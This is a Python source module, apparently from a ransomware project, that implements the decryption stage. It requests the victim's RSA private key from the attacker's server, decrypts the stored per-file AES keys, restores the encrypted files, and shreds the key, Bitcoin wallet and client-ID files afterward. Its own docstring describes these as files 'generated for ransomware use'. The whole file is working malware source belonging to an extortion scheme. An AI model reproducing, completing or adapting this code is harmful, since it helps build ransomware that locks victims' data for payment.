import os
import logging
import requests
from core.utils.file_ops import shred_file, write_data_to_file, read_data_from_file
from core.crypto.symmetric_encryption import AES
from core.crypto.asymmetric_encryption import RSA
from core.comms.decrypt import get_decrypted_key_from_server
from base64 import b64decode, b64encode
from core.config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    ENCRYPTED_AES_KEY_FILE_LOCATION,
    UNENCRYPTED_AES_KEY_FILE_LOCATION,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
    LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION,
    CLIENT_ID_LOCATION,
)

logger = logging.getLogger(__name__)


def decrypt_local_rsa_key():
    """Decrypt the locally generated RSA key by sending it to the server

    Returns:
        boolean: Status Indicator
    """    
    logger.info("Decrypting local RSA key")
    try:
        unencrypted_local_private_key = get_decrypted_key_from_server()
        shred_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
        write_data_to_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key)
    except Exception as err:
        logger.error(err)

    return True


def decrypt_file_encryption_details():
    """Decrypts the file encryption details (AES key, Initialization Vector, file path) using the locally generated RSA private key
    """    
    logger.info("Decrypting file encryption details")
    local_master_private_key = read_data_from_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
    cipher = RSA(private_key=local_master_private_key)
    encrypted_file_encryption_details = read_data_from_file(ENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)

    file_data = []
    for detail in encrypted_file_encryption_details:
        if isinstance(detail, list):
            file_data.append(b"".join([cipher.decrypt_data(part) for part in detail]))
        else:
            file_data.append(cipher.decrypt_data(detail))

    write_data_to_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, file_data, serialized=False)
    shred_file(ENCRYPTED_AES_KEY_FILE_LOCATION)


def decode_file_encryption_details(detail):
    """Decodes base64 encoded file details

    Args:
        detail (str): base64 encoded AES Key, Initialization Vector, File path seperated by tabs

    Returns:
        tuple: AES Key, Initialization Vector, File path
    """    
    detail = [b64decode(detail) for detail in detail.decode().split("\t")]
    return detail[0], detail[1], detail[-1]


def decrypt_file(aes_key, initialization_vector, encrypted_file_path):
    """Decrypt the files using the AES keys they were encrypted with

    Args:
        aes_key (str): AES Secret Key
        initialization_vector (str): AES Intialization Vector
        encrypted_file_path (str): Absolute path of the file
    """    
    logger.info(f"Decrypting file: {encrypted_file_path}")
    cipher = AES(aes_key, initialization_vector)
    encrypted_data = read_data_from_file(encrypted_file_path)
    data = cipher.decrypt_data(encrypted_data)
    original_file_path = os.path.splitext(encrypted_file_path)[0]
    write_data_to_file(original_file_path, data)
    shred_file(encrypted_file_path)


def delete_key_files():
    """Shred files generated for ransomware use
    """    
    list_of_important_files = [
        UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
        UNENCRYPTED_AES_KEY_FILE_LOCATION,
        ENCRYPTED_BITCOIN_KEY_LOCATION,
        BITCOIN_WALLET_ID_PATH,
        CLIENT_ID_LOCATION,
        LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION
    ]
    for file in list_of_important_files:
        shred_file(file)


def decrypt_files():
    """Driver function to decrypt files
    """    
    key_detail = read_data_from_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
    for detail in key_detail:
        aes_key, initialization_vector, file_path = decode_file_encryption_details(detail)
        decrypt_file(aes_key, initialization_vector, file_path)


def start_decryption():
    """Driver function for the decryption process
    """ 
    if decrypt_local_rsa_key():
        decrypt_file_encryption_details()
        decrypt_files()
        delete_key_files()

